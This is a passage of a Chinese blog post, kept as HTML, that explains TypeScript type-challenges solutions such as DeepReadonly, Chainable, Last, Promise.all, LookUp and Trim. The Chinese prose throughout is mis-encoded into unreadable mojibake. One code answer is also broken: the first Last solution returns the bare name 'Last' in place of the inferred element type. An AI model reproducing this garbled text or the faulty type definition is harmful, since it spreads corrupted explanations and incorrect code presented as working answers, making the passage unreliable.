  [P <span class="hljs-keyword">in</span> keyof T <span class="hljs-keyword">as</span> P <span class="hljs-keyword">extends</span> K ? <span class="hljs-built_in">never</span> : P]: T[P];
};
</code></pre>
<p>æ³¨æ„è¿™é‡Œçš„ <code>as</code> å…¶å®æ˜¯è¿™æ ·çš„ <code>[P in keyof T as (P extends K ? never : P)]: T[A]</code>ï¼Œ<code>as</code> åé¢çš„ <code>P</code> å’Œå‰é¢çš„å‘½åå¿…é¡»æ˜¯ä¸€æ ·çš„ã€‚</p>
<h3 data-id="heading-17">16. Medium - 8 - Readonly 2 å¯¹è±¡éƒ¨åˆ†å±æ€§åªè¯»</h3>
<p><code>MyReadonly2&lt;T, K&gt;</code> åœ¨ <code>T</code> æŠŠ <code>K</code> åŒ…å«çš„å±æ€§ç½®ä¸º <code>readonly</code> å…¶ä½™ä¸å˜ï¼Œä¸ä¼  <code>K</code> å°±æŠŠæ‰€æœ‰çš„å±æ€§å˜æˆ <code>readonly</code>ï¼Œæ­¤æ—¶åŒ <code>Readonly</code>ã€‚</p>
<p>é‡ç‚¹æ˜¯ <code>K</code> å¯ä»¥ä¸ä¼ ï¼Œæ‰€ä»¥è¦èµ‹é»˜è®¤å€¼ã€‚</p>
<p>ä» medium é¢˜ç›®å¼€å§‹ï¼Œå¤§å®¶å¯ä»¥æ…¢æ…¢åœ°æŠŠä¸åŒçš„ç±»å‹ç»“åˆèµ·æ¥ä½¿ç”¨äº†ï¼Œä¸€å¥è¯å†™è¿˜æ˜¯æ¯”è¾ƒéš¾ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MyReadonly2</span>&lt;T, K <span class="hljs-keyword">extends</span> keyof T = 
    keyof T&gt; = <span class="hljs-title class_">Readonly</span>&lt;<span class="hljs-title class_">Pick</span>&lt;T, K&gt;&gt; &amp; <span class="hljs-title class_">Omit</span>&lt;T, K&gt;
</code></pre>
<h3 data-id="heading-18">17. Medium - 9 - Deep Readonly å¯¹è±¡å±æ€§åªè¯»ï¼ˆé€’å½’ï¼‰â€»</h3>
<p>é¢˜ç›®è¦æ±‚ï¼šå®ç°ä¸€ä¸ªæ³›å‹ <code>DeepReadonly&lt;T&gt;</code>ï¼Œå®ƒå°†å¯¹è±¡çš„æ¯ä¸ªå‚æ•°åŠå…¶å­å¯¹è±¡é€’å½’åœ°è®¾ä¸ºåªè¯»ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">DeepReadonly</span>&lt;T&gt; = {
  <span class="hljs-keyword">readonly</span> [P <span class="hljs-keyword">in</span> keyof T]: keyof T[P] <span class="hljs-keyword">extends</span> <span class="hljs-built_in">never</span> ? T[P] : <span class="hljs-title class_">DeepReadonly</span>&lt;T[P]&gt;;
};
</code></pre>
<p>è¿™é“é¢˜ç›®æœ€éš¾çš„å°±æ˜¯ï¼Œå¦‚ä½•åˆ¤æ–­ä¸€ä¸ªç±»å‹æ˜¯å¦éœ€è¦ç»§ç»­é€’å½’åªè¯»ï¼Œè€Œè¿™é‡Œæœ€ç²¾å½©çš„åœ°æ–¹å°±æ˜¯å…³äº <code>never</code> çš„åº”ç”¨: <code>keyof T extends never</code> è¡¨ç¤ºæ£€æŸ¥ <code>T</code> æ˜¯å¦æœ‰å¯æšä¸¾çš„é”®ã€‚æ¥ä¸‹æ¥é—®é¢˜å°±ç®€å•å¤šäº†ï¼Œå¦‚æœæ˜¯å­˜åœ¨å°±é€’å½’è°ƒç”¨ DeepReadonly å¦åˆ™ç›´æ¥è¿”å›å½“å‰ç±»å‹ã€‚</p>
<p>å…³äº <code>never</code> çš„åº”ç”¨å…¶å®æœ‰å¾ˆå¤šï¼Œåœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘æ›¾ç»æ€»ç»“è¿‡ä¸€äº› <a href="https://juejin.cn/post/7514244463226863625" target="_blank" title="https://juejin.cn/post/7514244463226863625">ã€Šä» Vue3 æºç ä¸­äº†è§£ä½ æ‰€ä¸çŸ¥é“çš„ neverã€‹</a></p>
<h3 data-id="heading-19">18. Medium - 10 - Tuple to Union å…ƒç»„è½¬åˆé›†</h3>
<p>é¢˜ç›®è¦æ±‚ï¼šå®ç°æ³›å‹ <code>TupleToUnion&lt;T&gt;</code>ï¼Œå®ƒè¿”å›å…ƒç»„æ‰€æœ‰å€¼çš„åˆé›†ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">TupleToUnion</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span>[]&gt; = T[<span class="hljs-built_in">number</span>];
</code></pre>
<p>è¿™ç±»é¢˜ç›®å•çº¯è€ƒéªŒè¯­æ³•ã€‚</p>
<ul>
<li><code>T[number]</code> ä½¿ç”¨äº†Â <strong>ç´¢å¼•è®¿é—®ç±»å‹ï¼ˆIndexed Access Typesï¼‰</strong> ã€‚</li>
<li>åœ¨ TypeScript ä¸­ï¼Œæ•°ç»„æˆ–å…ƒç»„çš„ç´¢å¼•æ˜¯æ•°å­—ã€‚é€šè¿‡ä½¿ç”¨Â <code>number</code>Â å…³é”®å­—ä½œä¸ºç´¢å¼•ï¼ŒTypeScript ä¼šè·å–è¯¥æ•°ç»„/å…ƒç»„ä¸­ <strong>æ‰€æœ‰</strong> æ•°å€¼ç´¢å¼•ä½ç½®å¯¹åº”çš„ç±»å‹ï¼Œå¹¶å°†å®ƒä»¬ç»„åˆæˆä¸€ä¸ªè”åˆç±»å‹ã€‚</li>
</ul>
<h3 data-id="heading-20">19. Medium - 12 - Chainable Options å¯ä¸²è”æ„é€ å™¨ â€»</h3>
<p>è¿™é“é¢˜æ¯”è¾ƒå¤æ‚ï¼Œå®ç°ä¸€ä¸ªå¯ä»¥é“¾å¼è°ƒç”¨çš„ä¸²è”æ„é€ å™¨çš„ç±»å‹å®šä¹‰ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Chainable</span> = {
  <span class="hljs-title function_">option</span>(<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">value</span>: <span class="hljs-built_in">any</span>): <span class="hljs-built_in">any</span>
  <span class="hljs-title function_">get</span>(): <span class="hljs-built_in">any</span>
}

<span class="hljs-keyword">const</span> result = config
  .<span class="hljs-title function_">option</span>(<span class="hljs-string">'foo'</span>, <span class="hljs-number">123</span>)
  .<span class="hljs-title function_">option</span>(<span class="hljs-string">'name'</span>, <span class="hljs-string">'type-challenges'</span>)
  .<span class="hljs-title function_">option</span>(<span class="hljs-string">'bar'</span>, { <span class="hljs-attr">value</span>: <span class="hljs-string">'Hello World'</span> })
  .<span class="hljs-title function_">get</span>()

<span class="hljs-comment">// æœŸæœ› result çš„ç±»å‹æ˜¯ï¼š</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Result</span> {
  <span class="hljs-attr">foo</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">bar</span>: {
    <span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span>
  }
}
</code></pre>
<p>å…¶ä¸­ <code>get</code> æ¯”è¾ƒç®€å•ï¼Œç›´æ¥è¿”å›å½“å‰ä¼ å…¥çš„ç±»å‹å³å¯ã€‚
é‡ç‚¹æ˜¯ <code>option(key: K, value: V)</code>ï¼Œå®ƒä¼šæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç„¶åè¿”å›ä¸€ä¸ªæ–°çš„ <code>Chainable&lt;X&gt;</code>ã€‚X ä¸º <code>T</code> å’Œ <code>Record&lt;K, V&gt;</code> çš„è”åˆç±»å‹ã€‚å½“å‰ç­”æ¡ˆï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Chainable</span>&lt;T = {}&gt; = {
  option&lt;K <span class="hljs-keyword">extends</span> keyof <span class="hljs-built_in">any</span>, V&gt;(<span class="hljs-attr">key</span>: K, <span class="hljs-attr">value</span>: V): <span class="hljs-title class_">Chainable</span>&lt;T &amp; <span class="hljs-title class_">Record</span>&lt;K, V&gt;&gt;
  <span class="hljs-title function_">get</span>(): T
}
</code></pre>
<p>å¦‚æœä¸é™åˆ¶ <code>K</code> çš„ç±»å‹ï¼Œä¼šæŠ¥é”™ï¼Œå› ä¸º <code>K</code> ä½œä¸ºå¯¹è±¡çš„é”®ï¼Œç±»å‹å¿…é¡»ä¸º <code>string | number | symbol</code>ï¼Œè€Œ <code>keyof any</code> çš„ç»“æœåˆšå¥½å°±æ˜¯ <code>string | number | symbol</code>ï¼Œä¹ä¸€çœ‹å¾ˆç¥å¥‡ï¼Œä»”ç»†æƒ³æƒ³ä¹Ÿåˆç†:&gt;ã€‚</p>
<p>ä½†æ˜¯åœ¨è¿™ä¸ªcaseä¸­ä¼šæŠ¥é”™ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> result3 = a
  .<span class="hljs-title function_">option</span>(<span class="hljs-string">'name'</span>, <span class="hljs-string">'another name'</span>)
  <span class="hljs-comment">// @ts-expect-error</span>
  .<span class="hljs-title function_">option</span>(<span class="hljs-string">'name'</span>, <span class="hljs-number">123</span>)
  .<span class="hljs-title function_">get</span>();
  
<span class="hljs-comment">/*
type Expected3 = {
  name: number;
};
*/</span>
</code></pre>
<p>è¿™é‡Œè¦æ±‚ä¼ å…¥é‡å¤çš„ <code>key</code> ç±»å‹æ—¶éœ€è¦æŠ¥é”™ï¼ŒåŒæ—¶å­˜åœ¨é‡å¤çš„ <code>key</code> ç±»å‹æ—¶ï¼Œåé¢çš„ä¼ å…¥çš„ç±»å‹ä¼šè¦†ç›–å‰é¢çš„ç±»å‹ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Chainable</span>&lt;T = {}&gt; = {
  option&lt;K <span class="hljs-keyword">extends</span> keyof <span class="hljs-built_in">any</span>, V&gt;(
    <span class="hljs-attr">key</span>: K <span class="hljs-keyword">extends</span> keyof T ? <span class="hljs-built_in">never</span> : K,
    <span class="hljs-attr">value</span>: V
  ): <span class="hljs-title class_">Chainable</span>&lt;<span class="hljs-title class_">Omit</span>&lt;T, K&gt; &amp; <span class="hljs-title class_">Record</span>&lt;K, V&gt;&gt;;
  <span class="hljs-title function_">get</span>(): T;
};
</code></pre>
<p>é€šè¿‡æŒ‡å®š <code>K</code> çš„ç±»å‹ <code>K extends keyof T ? never : K</code> æ¥é™åˆ¶ä¸å…è®¸ä¼  <code>T</code> ä¸­å·²æœ‰çš„å±æ€§ï¼Œåœ¨é€šè¿‡ <code>Omit&lt;T, K&gt;</code> ä¿è¯ <code>T</code> ä¸­é‡å¤å±æ€§è¢«è¦†ç›–ã€‚</p>
<h3 data-id="heading-21">20. Medium - 15 - Last of Array æœ€åä¸€ä¸ªå…ƒç´ </h3>
<p>å®ç°ä¸€ä¸ª <code>Last&lt;T&gt;</code> æ³›å‹ï¼Œå®ƒæ¥å—ä¸€ä¸ªæ•°ç»„ <code>T</code> å¹¶è¿”å›å…¶æœ€åä¸€ä¸ªå…ƒç´ çš„ç±»å‹ã€‚</p>
<p>è¿™é“é¢˜ä¸éš¾ï¼Œä½†æ˜¯æœ‰ä¸€äº›æœ‰è¶£çš„è§£æ³•ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Last</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">any</span>[]&gt; = T <span class="hljs-keyword">extends</span> [...infer _, infer L]
  ? <span class="hljs-title class_">Last</span>
  : <span class="hljs-built_in">never</span>;
</code></pre>
<p>è¿™æ˜¯æœ€ç›´è§‚çš„è§£æ³•ï¼Œ<code>[...infer _, infer L]</code> æ˜¯ TS çš„æ•°ç»„æ¨¡å¼åŒ¹é…ã€‚å®ƒå°è¯•å°†æ•°ç»„åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šå‰é¢çš„ä»»æ„ä¸ªå…ƒç´ ï¼ˆ<code>_</code>ï¼‰å’Œæœ€åä¸€ä¸ªå…ƒç´ ï¼ˆ<code>L</code>ï¼‰ï¼Œå¦‚æœåŒ¹é…æˆåŠŸï¼Œå°±ç›´æ¥è¿”å› <code>L</code>ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Last</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">any</span>[]&gt; = T <span class="hljs-keyword">extends</span> [infer <span class="hljs-title class_">Only</span>]
  ? <span class="hljs-title class_">Only</span>
  : T <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">any</span>, ...infer <span class="hljs-title class_">Rest</span>]
  ? <span class="hljs-title class_">Last</span>&lt;<span class="hljs-title class_">Rest</span>&gt;
  : T[<span class="hljs-number">0</span>];
</code></pre>
<p>å°è¯•é€šè¿‡é€’å½’è·å–æœ€åä¸€ä¸ªå…ƒç´ ï¼Œæ³¨æ„ä¸€å®šè¦å…ˆåˆ¤æ–­æ•°ç»„æ˜¯å¦åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œå¦åˆ™åªæœ‰ä¸€ä¸ªå…ƒç´ çš„æ—¶å€™ï¼Œ<code>Rest</code> ä¼šè¢«åŒ¹é…ä¸º <code>[]</code> æˆ‘ä»¬å°±æ— æ³•æ‹¿åˆ°æœ€åä¸€ä¸ªå…ƒç´ äº†ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Last</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span>[]&gt; = [<span class="hljs-built_in">any</span>, ...T][T[<span class="hljs-string">'length'</span>]];
</code></pre>
<p>å¾ˆå¤©æ‰çš„è§£æ³•ï¼Œæˆ‘æƒ³é€šè¿‡ <code>T['length' - 1]</code> æ¥è·å–æœ€åä¸€ä¸ªå…ƒç´ ï¼Œä½†æ˜¯ TS çš„ç±»å‹æ— æ³•è¢«è®¡ç®—ï¼Œè¿™ç§è§£æ³•æ˜¯åå‘æ€ç»´ï¼Œåœ¨æ•°ç»„çš„æœ€å‰é¢åŠ ä¸€ä¸ªå…ƒç´ ï¼Œè¿™æ · <code>length</code> å¯¹åº”çš„å°±æ˜¯æœ€åä¸€ä¸ªç±»å‹å…ƒç´ äº†ã€‚</p>
<h3 data-id="heading-22">21. Medium - 16 - Pop æ’é™¤æœ€åä¸€é¡¹</h3>
<p>å®ç°ä¸€ä¸ªæ³›å‹ <code>Pop&lt;T&gt;</code>ï¼Œå®ƒæ¥å—ä¸€ä¸ªæ•°ç»„ <code>T</code>ï¼Œå¹¶è¿”å›ä¸€ä¸ªç”±æ•°ç»„ <code>T</code> çš„å‰ N-1 é¡¹ï¼ˆN ä¸ºæ•°ç»„ <code>T</code> çš„é•¿åº¦ï¼‰ä»¥ç›¸åŒçš„é¡ºåºç»„æˆçš„æ•°ç»„ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Pop</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span>[]&gt; = T <span class="hljs-keyword">extends</span> [...infer F, infer _] ? F : [];
</code></pre>
<p>è¿™é“é¢˜ç›®ä¹Ÿä¸éš¾ï¼ŒæŒæ¡ <code>infer</code> çš„åº”ç”¨å³å¯ã€‚å› ä¸º <code>Pop&lt;[]&gt;</code> ä¹Ÿæ˜¯ <code>[]</code> æ‰€ä»¥ä¸åŒ¹é…çš„æ—¶å€™ä¹Ÿä¸º <code>[]</code>ã€‚</p>
<h3 data-id="heading-23">22. Medium - 20 - Promise.all â€»</h3>
<p>å¥½éš¾çš„é¢˜T^T</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Awaited</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer R&gt; ? <span class="hljs-title class_">Awaited</span>&lt;R&gt; : T 

<span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> <span class="hljs-title class_">PromiseAll</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span>[]&gt;(<span class="hljs-attr">values</span>: <span class="hljs-keyword">readonly</span> [...T]):
    <span class="hljs-title class_">Promise</span>&lt;{ [P <span class="hljs-keyword">in</span> keyof T]: <span class="hljs-title class_">Awaited</span>&lt;T[P]&gt; }&gt;
</code></pre>
<p><code>Awaited</code> éƒ¨åˆ†å‰é¢çš„é¢˜ç›®åšè¿‡å°±ä¸èµ˜è¿°äº†ã€‚</p>
<p><code>readonly</code> è¡¨ç¤ºè¾“å…¥çš„æ•°ç»„æ˜¯åªè¯»çš„ï¼Œ<code>[...T]</code> è¡¨ç¤ºä½¿ç”¨äº†<strong>å˜é•¿å…ƒç»„ç±»å‹ï¼ˆVariadic Tuple Typesï¼‰</strong> ã€‚å®ƒçš„ä½œç”¨æ˜¯å°†ä¼ å…¥çš„å‚æ•°è§†ä¸ºä¸€ä¸ªå…ƒç»„ï¼ˆTupleï¼‰è€Œä¸æ˜¯æ™®é€šçš„æ•°ç»„ã€‚</p>
<p><code>[P in keyof T]: Awaited&lt;T[P]&gt;</code> æ˜¯ä¸€ä¸ª <strong>æ˜ å°„å…ƒç»„ç±»å‹ï¼ˆMapped Tuple Typeï¼‰</strong>ï¼Œå®ƒä¼šéå†å…ƒç»„Â <code>T</code>Â çš„æ¯ä¸€ä¸ªç´¢å¼•Â <code>P</code>ï¼Œç„¶åæŠŠå®ƒçš„ç±»å‹æ˜ å°„ä¸º <code>Awaited&lt;T[P]&gt;</code>ã€‚</p>
<h3 data-id="heading-24">23. Medium - 62 - Type Lookup æŸ¥æ‰¾ç±»å‹</h3>
<p>é€šè¿‡åœ¨è”åˆç±»å‹ä¸­é€šè¿‡æŒ‡å®šå…¬å…±å±æ€§ <code>type</code> çš„å€¼æ¥è·å–ç›¸åº”çš„ç±»å‹ï¼Œä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Cat</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'cat'</span>
  <span class="hljs-attr">breeds</span>: <span class="hljs-string">'Abyssinian'</span> | <span class="hljs-string">'Shorthair'</span> | <span class="hljs-string">'Curl'</span> | <span class="hljs-string">'Bengal'</span>
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Dog</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'dog'</span>
  <span class="hljs-attr">breeds</span>: <span class="hljs-string">'Hound'</span> | <span class="hljs-string">'Brittany'</span> | <span class="hljs-string">'Bulldog'</span> | <span class="hljs-string">'Boxer'</span>
  <span class="hljs-attr">color</span>: <span class="hljs-string">'brown'</span> | <span class="hljs-string">'white'</span> | <span class="hljs-string">'black'</span>
}

<span class="hljs-keyword">type</span> <span class="hljs-title class_">MyDog</span> = <span class="hljs-title class_">LookUp</span>&lt;<span class="hljs-title class_">Cat</span> | <span class="hljs-title class_">Dog</span>, <span class="hljs-string">'dog'</span>&gt; <span class="hljs-comment">// expected to be `Dog`</span>
</code></pre>
<p>å¾ˆæœ‰è¶£çš„é¢˜ç›®ï¼Œå› ä¸ºå‰é¢ <code>Exclude</code> ä¸­æˆ‘ä»¬å­¦åˆ°äº†ï¼š</p>
<blockquote>
<p><code>type MyExclude&lt;T, U&gt; = T extends U ? never : T;</code></p>
<p>å½“Â <code>T extends U ? ...</code>Â ä¸­çš„Â <code>T</code>Â ä¸ºè”åˆç±»å‹æ—¶ï¼Œä¼šæŠŠè”åˆç±»å‹ä¸­çš„æ¯ä¸€ä¸ªç±»å‹å•ç‹¬è¿›è¡Œåˆ¤æ–­ï¼Œç„¶åå†æŠŠç»“æœç»„åˆæˆä¸€ä¸ªè”åˆç±»å‹è¿”å›ã€‚</p>
</blockquote>
<p>æ‰€ä»¥ä¸€å¼€å§‹æˆ‘ç†æ‰€å½“ç„¶åœ°å†™æˆï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span>Â <span class="hljs-title class_">LookUp</span>&lt;UÂ <span class="hljs-keyword">extends</span>Â { <span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span> },Â T&gt;Â =Â U[<span class="hljs-string">'type'</span>]Â <span class="hljs-keyword">extends</span>Â TÂ ?Â UÂ :Â <span class="hljs-built_in">never</span>
</code></pre>
<p>ä½†æ˜¯ TS è¯­æ³•åšå¤§ç²¾æ·±ï¼Œä½†æ˜¯åªæœ‰å•ç‹¬ä½¿ç”¨è”åˆç±»å‹æ—¶ï¼ˆnaked typeï¼‰ï¼Œæ‰ä¼šä½¿ç”¨<strong>åˆ†å¸ƒå¼æ¡ä»¶ç±»å‹</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ <code>extends</code> å·¦è¾¹å¿…é¡»æ˜¯å•ç‹¬çš„ <code>U</code>ã€‚</p>
<p>æ¢ä¸ªæ€è·¯ï¼Œæˆ‘ä»¬è°ƒæ•´ <code>extends</code> çš„å³è¾¹ã€‚æ‰€ä»¥ç­”æ¡ˆä¸ºï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">LookUp</span>&lt;U <span class="hljs-keyword">extends</span> { <span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span> }, T&gt; = U <span class="hljs-keyword">extends</span> { <span class="hljs-attr">type</span>: T } ? U : <span class="hljs-built_in">never</span>;
</code></pre>
<h3 data-id="heading-25">24. Medium - 106 - Trim Left å»é™¤å·¦ä¾§ç©ºç™½ â€»</h3>
<p>å®ç°Â <code>TrimLeft&lt;T&gt;</code>Â ï¼Œå®ƒæ¥æ”¶ç¡®å®šçš„å­—ç¬¦ä¸²ç±»å‹å¹¶è¿”å›ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼Œå…¶ä¸­æ–°è¿”å›çš„å­—ç¬¦ä¸²åˆ é™¤äº†åŸå­—ç¬¦ä¸²å¼€å¤´çš„ç©ºç™½å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> trimmed = <span class="hljs-title class_">TrimLeft</span>&lt;<span class="hljs-string">'  Hello World  '</span>&gt; <span class="hljs-comment">// åº”æ¨å¯¼å‡º 'Hello World  '</span>
</code></pre>
<p>è¿™æ˜¯åˆ°ç›®å‰ä¸ºæ­¢é‡åˆ°çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ¨¡æ¿ç±»å‹çš„é¢˜ç›®ã€‚ç›¸å…³çŸ¥è¯†ç‚¹å¯ä»¥çœ‹ä¸‹è¿™ä¸ªæ–‡ç«  <a href="https://juejin.cn/post/7597664149170192426" target="_blank" title="https://juejin.cn/post/7597664149170192426">ã€Šä½ ä¸çŸ¥é“çš„ TypeScriptï¼šæ¨¡æ¿å­—ç¬¦ä¸²ç±»å‹ã€‹</a></p>
<p>ç›´æ¥çœ‹ç­”æ¡ˆå§ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Space</span> = <span class="hljs-string">' '</span> | <span class="hljs-string">'\n'</span> | <span class="hljs-string">'\t'</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">TrimLeft</span>&lt;S <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = S <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${Space}</span><span class="hljs-subst">${infer R}</span>`</span> ? <span class="hljs-title class_">TrimLeft</span>&lt;R&gt; : S
</code></pre>
<p>åœ¨æ¨¡æ¿å­—ç¬¦ä¸²ç±»å‹ä¸­ï¼Œå¯ä»¥é€šè¿‡ <code>infer</code> å®ç°ç±»ä¼¼äºæ­£åˆ™åŒ¹é…çš„æ•ˆæœã€‚</p>
<p>é¦–å…ˆå®šä¹‰ç©ºç™½å­—ç¬¦è”åˆç±»å‹ <code>type Space = ' ' | '\n' | '\t'</code>ã€‚æ³¨æ„è¿™é‡Œ <code>''</code> å’Œ <code>'\n'</code> æˆ– <code>'\t'</code> éƒ½æ˜¯ <strong>å­—ç¬¦ä¸²å­—é¢é‡ç±»å‹</strong>ï¼Œåƒä¸‡ä¸èƒ½å†™æˆ <code>\s</code> é‚£ä¸æ˜¯å­—ç¬¦ä¸²å­—é¢é‡ï¼Œè€Œæ˜¯æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„è¯­æ³•ï¼ŒTSå¹¶æ²¡æœ‰å†…ç½®æ­£åˆ™è¡¨è¾¾å¼å¼•æ“ã€‚</p>
<p>å½“è”åˆç±»å‹å‡ºç°åœ¨æ¨¡æ¿å­—ç¬¦ä¸²æ’å€¼ä¸­æ—¶ï¼ŒTS ä¼šå°è¯•åŒ¹é…è”åˆç±»å‹ä¸­çš„ä»»æ„ä¸€ä¸ªæˆå‘˜ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒä¼šæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ä»¥Â <code>' '</code>Â <strong>æˆ–</strong>Â <code>'\n'</code>Â <strong>æˆ–</strong>Â <code>'\t'</code>Â å¼€å¤´ã€‚</p>
<p>å¦‚æœ <code>S</code> èƒ½åŒ¹é… <code>${Space}${infer R}</code> æ¨¡å¼ï¼Œåˆ™ <code>R</code> ä¸ºé™¤äº†ç¬¬ä¸€ä¸ªç©ºç™½å­—ç¬¦å¤–çš„å‰©ä½™å­—ç¬¦ä¸²ç»„æˆçš„ç±»å‹ã€‚è¿™æ ·é€šè¿‡é€’å½’æˆ‘ä»¬å°±èƒ½å¾—åˆ° <code>TrimLeft</code>ã€‚</p>
<h3 data-id="heading-26">25. Medium - 108 - Trim å»é™¤ä¸¤ç«¯ç©ºç™½å­—ç¬¦</h3>
<p>æœ‰äº†ä¸Šé¢çš„é¢˜ç›®ï¼Œè¿™é“é¢˜å°±æ¯”è¾ƒç®€å•äº†ï¼Œå…ˆç§»é™¤å·¦è¾¹ï¼Œå†ç§»é™¤å³è¾¹ç©ºç™½å³å¯</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Space</span> = <span class="hljs-string">' '</span> | <span class="hljs-string">'\t'</span> | <span class="hljs-string">'\n'</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">TrimLeft</span>&lt;S <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = S <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${Space}</span><span class="hljs-subst">${infer R}</span>`</span> ? <span class="hljs-title class_">TrimLeft</span>&lt;R&gt; : S;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">TrimRight</span>&lt;S <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = S <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${infer L}</span><span class="hljs-subst">${Space}</span>`</span> ? <span class="hljs-title class_">TrimRight</span>&lt;L&gt; : S;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Trim</span>&lt;S <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = <span class="hljs-title class_">TrimRight</span>&lt;<span class="hljs-title class_">TrimLeft</span>&lt;S&gt;&gt;
</code></pre>
<p>ä¹Ÿå¯ä»¥å·§å¦™åœ°ä½¿ç”¨è”åˆç±»å‹ï¼Œä¸€æ¬¡æ€§åŒ¹é…ä¸¤è¾¹çš„ç©ºç™½ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Trim</span>&lt;S <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; =
  S <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${Space}</span><span class="hljs-subst">${infer T}</span>`</span> | <span class="hljs-string">`<span class="hljs-subst">${infer T}</span><span class="hljs-subst">${Space}</span>`</span> ? <span class="hljs-title class_">Trim</span>&lt;T&gt; : S;
</code></pre>
<h3 data-id="heading-27">26. Medium - 110 -  Capitalize</h3>
<p>å°†ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„é¦–å­—æ¯è½¬ä¸ºå¤§å†™ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MyCapitalize</span>&lt;S <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = 
    S <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${infer F}</span><span class="hljs-subst">${infer X}</span>`</span> ? <span class="hljs-string">`<span class="hljs-subst">${Uppercase&lt;F&gt;}</span><span class="hljs-subst">${X}</span>`</span> : S
</code></pre>
<ul>
